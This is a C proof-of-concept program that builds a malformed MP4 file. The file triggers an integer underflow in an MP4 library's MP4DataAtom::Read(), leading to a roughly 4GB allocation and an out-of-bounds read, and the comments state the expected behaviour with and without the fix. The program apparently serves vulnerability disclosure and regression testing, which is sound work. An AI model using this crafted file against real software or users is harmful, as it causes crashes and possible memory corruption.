/*
 * POC: Integer underflow in MP4DataAtom::Read()
 *
 * Vulnerability: In atom_meta.cpp, MP4DataAtom::Read() computes:
 *     metadata.SetValueSize( m_size - 8 );
 * without checking that m_size >= 8. When m_size < 8, the uint64_t
 * subtraction wraps to a huge value, which is then truncated to uint32_t
 * and used as an allocation size. This causes a massive heap allocation
 * followed by an out-of-bounds read from the file into heap memory.
 *
 * The "data" atom expects 8 bytes of fixed properties before the variable-
 * length metadata field:
 *   - typeReserved (2 bytes)
 *   - typeSetIdentifier (1 byte)
 *   - typeCode (1 byte)
 *   - locale (4 bytes)
 *
 * If the atom's content size (m_size) is less than 8, the subtraction
 * underflows.
 *
 * This POC generates a minimal MP4 file with the structure:
 *   ftyp -> moov -> udta -> meta -> hdlr + ilst -> ----  -> data (malformed)
 *
 * The malformed "data" atom has a total size of 10 bytes (8 byte header +
 * 2 bytes of content), giving m_size = 2. The computation "2 - 8" wraps
 * to 0xFFFFFFFFFFFFFFFA as uint64_t, which truncates to 0xFFFFFFFA as
 * uint32_t (~4GB allocation attempt).
 *
 * Usage:
 *   ./poc_cve_meta_underflow <output_filename>
 *
 * Then trigger with:
 *   MP4Read(<output_filename>)
 *
 * Expected result (without fix): crash or massive allocation
 * Expected result (with fix): clean exception/error "invalid data atom size"
 */

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <arpa/inet.h>  // htonl, htons

static void write_u32(FILE* f, uint32_t v) {
    v = htonl(v);
    fwrite(&v, 4, 1, f);
}

static void write_u16(FILE* f, uint16_t v) {
    v = htons(v);
    fwrite(&v, 2, 1, f);
}

static void write_u8(FILE* f, uint8_t v) {
    fwrite(&v, 1, 1, f);
}

static void write_fourcc(FILE* f, const char* cc) {
    fwrite(cc, 4, 1, f);
}

/*
 * Write an atom header (size + type).
 * size includes the 8-byte header itself.
 */
static void write_atom_header(FILE* f, uint32_t size, const char* type) {
    write_u32(f, size);
    write_fourcc(f, type);
}

int main(int argc, char** argv)
{
    const char* filename = "poc_meta_underflow.mp4";
    if (argc > 1) {
        filename = argv[1];
    }

    FILE* f = fopen(filename, "wb");
    if (!f) {
        fprintf(stderr, "Failed to open %s for writing\n", filename);
        return 1;
    }

    /*
     * File structure (all sizes include 8-byte atom headers):
     *
     * ftyp (20 bytes): file type
     * moov (N bytes): movie container
     *   udta (M bytes): user data container
     *     meta (P bytes): metadata container (has 4 bytes version+flags)
     *       hdlr (33 bytes): handler - required by meta
     *       ilst (Q bytes): item list container
     *         ---- (R bytes): free-form item container (uses "----" type)
     *           data (10 bytes): THE MALFORMED ATOM (m_size=2, needs >=8)
     */

    /* Calculate sizes bottom-up */
    const uint32_t data_atom_size = 10;        /* 8 hdr + 2 bytes content (m_size=2, underflows at m_size-8) */
    const uint32_t item_atom_size = 8 + data_atom_size; /* "----" container */
    const uint32_t ilst_atom_size = 8 + item_atom_size;  /* ilst container */
    const uint32_t hdlr_atom_size = 33;        /* hdlr: 8 hdr + 4 ver/flags + 4 reserved + 4 type + 12 reserved + 1 name */
    const uint32_t meta_atom_size = 8 + 4 + hdlr_atom_size + ilst_atom_size; /* meta has 4 bytes version+flags */
    const uint32_t udta_atom_size = 8 + meta_atom_size;
    const uint32_t moov_atom_size = 8 + udta_atom_size;
    const uint32_t ftyp_atom_size = 20;         /* 8 hdr + 4 brand + 4 version + 4 compat */

    /* ftyp atom */
    write_atom_header(f, ftyp_atom_size, "ftyp");
    write_fourcc(f, "isom");  /* major brand */
    write_u32(f, 0x200);     /* minor version */
    write_fourcc(f, "isom");  /* compatible brand */

    /* moov atom (container) */
    write_atom_header(f, moov_atom_size, "moov");

    /* udta atom (container) */
    write_atom_header(f, udta_atom_size, "udta");

    /* meta atom (FullAtom: has version + flags before children) */
    write_atom_header(f, meta_atom_size, "meta");
    write_u32(f, 0);  /* version=0, flags=0 */

    /* hdlr atom inside meta (required by spec) */
    write_atom_header(f, hdlr_atom_size, "hdlr");
    write_u32(f, 0);          /* version + flags */
    write_u32(f, 0);          /* reserved */
    write_fourcc(f, "mdir");  /* handler type = "mdir" (metadata directory) */
    write_u32(f, 0);          /* reserved */
    write_u32(f, 0);          /* reserved */
    write_u32(f, 0);          /* reserved */
    write_u8(f, 0);           /* name (null terminated, 1 byte) */

    /* ilst atom (container for items) */
    write_atom_header(f, ilst_atom_size, "ilst");

    /* ---- atom (free-form item, container for mean/name/data) */
    write_atom_header(f, item_atom_size, "----");

    /*
     * THE MALFORMED "data" ATOM
     *
     * Total size = 10 bytes (header=8 + content=2)
     * After ReadAtom processes it: m_size = 10 - 8 = 2
     * In MP4DataAtom::Read(): metadata.SetValueSize(2 - 8)
     *   = SetValueSize(0xFFFFFFFFFFFFFFFA)  -- uint64 underflow!
     *   = SetValueSize(0xFFFFFFFA)          -- truncated to uint32
     *   = attempts to allocate ~4GB and read that much from file
     */
    write_atom_header(f, data_atom_size, "data");
    write_u8(f, 0x00);  /* 1 byte of content */
    write_u8(f, 0x01);  /* 1 byte of content */
    /* Only 2 bytes of content, but MP4DataAtom::Read expects at least 8 */

    fclose(f);

    printf("POC file written: %s (%u bytes)\n", filename,
           ftyp_atom_size + moov_atom_size);
    printf("\nFile structure:\n");
    printf("  ftyp [%u bytes]\n", ftyp_atom_size);
    printf("  moov [%u bytes]\n", moov_atom_size);
    printf("    udta [%u bytes]\n", udta_atom_size);
    printf("      meta [%u bytes]\n", meta_atom_size);
    printf("        hdlr [%u bytes]\n", hdlr_atom_size);
    printf("        ilst [%u bytes]\n", ilst_atom_size);
    printf("          ---- [%u bytes]\n", item_atom_size);
    printf("            data [%u bytes] <-- MALFORMED (m_size=2, needs >=8)\n", data_atom_size);
    printf("\nVulnerability: m_size(2) - 8 = uint64 underflow -> ~4GB allocation\n");
    printf("\nTo trigger: call MP4Read(\"%s\")\n", filename);
    printf("Without fix: crash (OOM or heap overflow)\n");
    printf("With fix: throws exception \"invalid data atom size\"\n");

    return 0;
}
